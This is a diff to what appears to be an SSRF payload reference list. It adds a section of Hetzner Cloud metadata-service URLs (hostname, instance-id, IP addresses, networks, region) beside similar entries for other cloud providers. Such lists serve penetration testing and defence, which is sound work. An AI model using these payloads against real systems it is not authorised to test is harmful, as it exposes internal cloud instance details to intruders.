@@ -52,6 +52,7 @@
   * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
   * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
   * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
+  * [SSRF URL for Hetzner Cloud](#ssrf-url-for-hetzner-cloud)
   * [SSRF URL for Docker](#ssrf-url-for-docker)
   * [SSRF URL for Rancher](#ssrf-url-for-rancher)
 
@@ -803,6 +804,18 @@ http://192.0.0.192/latest/attributes/
 http://100.100.100.200/latest/meta-data/
 http://100.100.100.200/latest/meta-data/instance-id
 http://100.100.100.200/latest/meta-data/image-id
+```
+
+### SSRF URL for Hetzner Cloud
+
+```powershell
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/private-networks
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+http://169.254.169.254/hetzner/v1/metadata/region
 ```
 
 ### SSRF URL for Kubernetes ETCD
